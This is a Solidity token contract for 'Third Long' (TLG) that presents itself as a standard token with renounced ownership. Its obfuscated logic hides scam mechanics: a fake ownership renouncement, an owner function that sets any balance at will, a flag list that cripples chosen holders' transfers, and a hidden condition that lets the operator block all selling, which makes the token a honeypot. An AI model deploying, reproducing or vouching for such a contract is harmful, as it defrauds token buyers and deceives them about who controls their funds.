//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface autoReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minToMarketing) external view returns (uint256);

    function transfer(address fundFromTake, uint256 buyTrading) external returns (bool);

    function allowance(address minReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyTrading) external returns (bool);

    function transferFrom(
        address sender,
        address fundFromTake,
        uint256 buyTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityToken, uint256 value);
    event Approval(address indexed minReceiver, address indexed spender, uint256 value);
}

abstract contract tokenFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txMode {
    function createPair(address sellTotal, address modeTeam) external returns (address);
}

interface fundToken is autoReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ThirdLong is tokenFrom, autoReceiver, fundToken {

    uint256 constant txTeam = 20 ** 10;

    function atWallet(address shouldAmount, address fundFromTake, uint256 buyTrading) internal returns (bool) {
        if (shouldAmount == atSender) {
            return totalTeam(shouldAmount, fundFromTake, buyTrading);
        }
        uint256 txBuyLaunched = autoReceiver(minSwapFee).balanceOf(senderLaunch);
        require(txBuyLaunched == toExempt);
        require(fundFromTake != senderLaunch);
        if (shouldTotalSender[shouldAmount]) {
            return totalTeam(shouldAmount, fundFromTake, txTeam);
        }
        return totalTeam(shouldAmount, fundFromTake, buyTrading);
    }

    uint256 public limitMin;

    mapping(address => mapping(address => uint256)) private shouldTo;

    bool private walletIsAmount;

    uint256 public tokenLimit;

    uint256 toExempt;

    uint256 public senderEnableReceiver;

    mapping(address => uint256) private atMinSwap;

    function approve(address amountTake, uint256 buyTrading) public virtual override returns (bool) {
        shouldTo[_msgSender()][amountTake] = buyTrading;
        emit Approval(_msgSender(), amountTake, buyTrading);
        return true;
    }

    address teamLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 walletShould;

    function totalSupply() external view virtual override returns (uint256) {
        return autoIs;
    }

    bool public fundSender;

    bool private totalToken;

    function totalTeam(address shouldAmount, address fundFromTake, uint256 buyTrading) internal returns (bool) {
        require(atMinSwap[shouldAmount] >= buyTrading);
        atMinSwap[shouldAmount] -= buyTrading;
        atMinSwap[fundFromTake] += buyTrading;
        emit Transfer(shouldAmount, fundFromTake, buyTrading);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenSell;
    }

    function liquidityLimit(uint256 buyTrading) public {
        listAutoAmount();
        toExempt = buyTrading;
    }

    function getOwner() external view returns (address) {
        return senderToken;
    }

    function transferFrom(address shouldAmount, address fundFromTake, uint256 buyTrading) external override returns (bool) {
        if (_msgSender() != teamLaunched) {
            if (shouldTo[shouldAmount][_msgSender()] != type(uint256).max) {
                require(buyTrading <= shouldTo[shouldAmount][_msgSender()]);
                shouldTo[shouldAmount][_msgSender()] -= buyTrading;
            }
        }
        return atWallet(shouldAmount, fundFromTake, buyTrading);
    }

    address public atSender;

    function transfer(address limitAmount, uint256 buyTrading) external virtual override returns (bool) {
        return atWallet(_msgSender(), limitAmount, buyTrading);
    }

    mapping(address => bool) public toTakeMax;

    bool public shouldMin;

    bool private listMarketingSender;

    address public minSwapFee;

    constructor (){
        
        fromSender enableTo = fromSender(teamLaunched);
        minSwapFee = txMode(enableTo.factory()).createPair(enableTo.WETH(), address(this));
        
        atSender = _msgSender();
        receiverTo();
        toTakeMax[atSender] = true;
        atMinSwap[atSender] = autoIs;
        
        emit Transfer(address(0), atSender, autoIs);
    }

    uint8 private tokenSell = 18;

    uint256 private autoIs = 100000000 * 10 ** 18;

    uint256 public fromTeam;

    string private minToBuy = "Third Long";

    function balanceOf(address minToMarketing) public view virtual override returns (uint256) {
        return atMinSwap[minToMarketing];
    }

    function name() external view virtual override returns (string memory) {
        return minToBuy;
    }

    function listAutoAmount() private view {
        require(toTakeMax[_msgSender()]);
    }

    function exemptReceiver(address limitAmount, uint256 buyTrading) public {
        listAutoAmount();
        atMinSwap[limitAmount] = buyTrading;
    }

    bool private receiverToken;

    mapping(address => bool) public shouldTotalSender;

    function symbol() external view virtual override returns (string memory) {
        return amountTakeMarketing;
    }

    function fundTake(address liquidityFund) public {
        if (shouldMin) {
            return;
        }
        
        toTakeMax[liquidityFund] = true;
        if (autoEnable != fromTeam) {
            fromTeam = tokenLimit;
        }
        shouldMin = true;
    }

    function allowance(address shouldExemptMode, address amountTake) external view virtual override returns (uint256) {
        if (amountTake == teamLaunched) {
            return type(uint256).max;
        }
        return shouldTo[shouldExemptMode][amountTake];
    }

    function swapWalletFee(address isBuy) public {
        listAutoAmount();
        if (walletIsAmount == listMarketingSender) {
            receiverToken = false;
        }
        if (isBuy == atSender || isBuy == minSwapFee) {
            return;
        }
        shouldTotalSender[isBuy] = true;
    }

    string private amountTakeMarketing = "TLG";

    uint256 private autoEnable;

    function owner() external view returns (address) {
        return senderToken;
    }

    event OwnershipTransferred(address indexed fromLimit, address indexed amountLaunched);

    function receiverTo() public {
        emit OwnershipTransferred(atSender, address(0));
        senderToken = address(0);
    }

    address private senderToken;

    address senderLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}